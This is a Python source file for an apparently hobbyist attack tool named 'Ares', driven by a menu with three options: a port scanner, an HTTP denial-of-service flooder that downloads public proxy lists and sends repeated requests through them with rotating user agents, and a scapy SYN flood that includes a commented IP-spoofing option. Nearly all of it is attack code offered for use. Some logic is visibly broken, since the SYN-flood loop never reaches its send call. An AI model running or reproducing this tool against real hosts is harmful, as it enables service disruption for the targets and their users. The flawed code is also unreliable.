import argparse
import socket # for connecting
import time
from colorama import init, Fore
from threading import Thread, Lock
from queue import Queue
import sys
import random
import requests
import wget
import os
from scapy.all import *

url=""
host = ""
start_port = ""
end_port = ""
username = os.environ.get( "USERNAME" )
# some colors
init()
GREEN = Fore.GREEN
RESET = Fore.RESET
GRAY = Fore.LIGHTBLACK_EX
RED = Fore.RED
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
CYAN = Fore.CYAN

def is_port_open(host, port):
    # creates a new socket
    s = socket.socket()
    try:
        # tries to connect to host using that port
        s.connect((host, port))
        # make timeout if you want it a little faster ( less accuracy )
        # s.settimeout(0.2)
    except:
        # cannot connect, port is closed
        # return false
        return False
    else:
        # the connection was established, port is open!
        return True
def start_scanner():
    try:
        print(f" {YELLOW} - - - - - Scanning ports - - - - - {RESET} ")
        time.sleep(0.5)
        # get the host from the user
        host = input("Enter the host: ")
        start_port = int(input("Start port: "))
        end_port = int(input("End port: "))
        end_port = end_port+1
        for port in range(start_port, end_port):
            if is_port_open(host, port):
                print(f"{GREEN}[+] {host}:{port} is open      {RESET}")
            else:
                print(f"{GRAY}[-] {host}:{port} is closed    {RESET}", end="\r")
    except:
        print(f" {RED}- - - - Somethink went wrong - - - - ")
        time.sleep(1)
        menu()

user_agents = [
  "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
  "Mozilla/5.0 (Linux; U; Android 4.0.4; en-gb; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
  "Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us; Silk/1.1.0-80) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16 Silk-Accelerated=true",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; Touch)"
  ]
random_user_agent = random.choice(user_agents)
headers = {
    'User-Agent': random_user_agent
}

def start_dos(): # основная функция
    global url
    print(f" {YELLOW} - - - - - DoS attack - - - - - {RESET} ")
    time.sleep(0.5)
    try:
        url = input("Enter URL: ")
        print(requests.get(url, headers=headers))
    except:
        print(f"{RED}Incorrect input")
        time.sleep(1)
        start_dos()
    i = input("Start ping on this URL? (y/n)")
    if i == "y":
        dos()
    elif i == "n":
        print("Back to menu")
        time.sleep(2)
        menu()
    else:
        print(f"{RED}Incorrect input")
        start_dos()

def dos(): # делаем запросы на нужный нам url
    try:
        print(f"{GRAY}If you want to stop - press 'Ctrl + C'")
        while True:
            proxies = {}
            url_to_save = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&c=all&ssl=all&anonymity=all"
            wget.download(url_to_save, "C:\\Users\\" + username + "\\Downloads\\http_proxies.txt")
            f = open("C:\\Users\\" + username + "\\Downloads\\http_proxies.txt", 'r')

            headers = {'user-agent': random_user_agent}

            i=0
            while i!=501:
                proxies['http' + str(i)] = f.readline(-1).replace('\n', '')
                print(proxies)
                i=i+1
            f.close()

            fproxie = {'http': ''}
            for i in range (0, 500):
                fproxie['http'] = proxies['http'+str(i)]
                for e in range (1, 6):
                    requests.get(url, proxies=fproxie, headers=headers)
                    requests.get(url, headers=headers)
                print(requests.get(url), i*10, f"{RED}has been sent!")
                print(f" {RED} Sending packets to{RESET}", url, f"{RED}")
        dos()
    except:
        print(f"{RESET}- - - - - Stopping the DoS - - - - - ")
        os.remove("C:\\Users\\" + username + "\\Downloads\\http_proxies.txt")
        time.sleep(1)
        menu()

def start_syn_flooder():
    try:
        print(f" {YELLOW} - - - - - SYN-Flood - - - - - {RESET} ")
        time.sleep(0.5)

        # target IP address (should be a testing router/firewall)
        target_ip = input("Enter IP (local): ")
        # the target port u want to flood
        target_port = 80
        # forge IP packet with target ip as the destination IP address
        ip = IP(dst=target_ip)
        # or if you want to perform IP Spoofing (will work as well)
        # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)

        # forge a TCP SYN packet with a random source port
        # and the target port as the destination port
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

        # add some flooding data (1KB in this case)
        raw = Raw(b"X"*1024)

        # stack up the layers
        p = ip / tcp / raw
        # send the constructed packet in a loop until CTRL+C is detected
        print(f"{GRAY}If you want to stop - press 'Ctrl + C'")
        time.sleep(1)
        while True:
            print(f"{RED}[+] Sending SYN-packets")
            time.sleep(1)
        send(p, loop=1, verbose=0)
    except:
        print(f" {RED} \n - - - - Stopping the SYN-Flood - - - - ")
        time.sleep(1)
        menu()

def menu():
    print(f"{RED} - - - - - Available actions - - - - - {GRAY}")
    choise = input(" [0] Exit\n [1] Port scanning\n [2] DoS attack\n [3] SYN-Flood\n Your input: ")
    if choise == "1":
        start_scanner()
    elif choise == "2":
        start_dos()
    elif choise == "3":
        start_syn_flooder()
    elif choise == "0":
        print(f"{RED} - - - - Closing the script - - - - {RESET}")
        time.sleep(1)
        sys.exit()
    else:
        print(f"{RED} Incorrect input {RESET}")
        menu()

if __name__ == "__main__":
    print(f"{RED}  - - - - Welcome to Ares - - - - {GRAY} \nVersion: 1.3\nGitHub: https://github.com/frainyggvp\nTelegram: @frainyggvp {RESET} ")
    time.sleep(3)
    menu()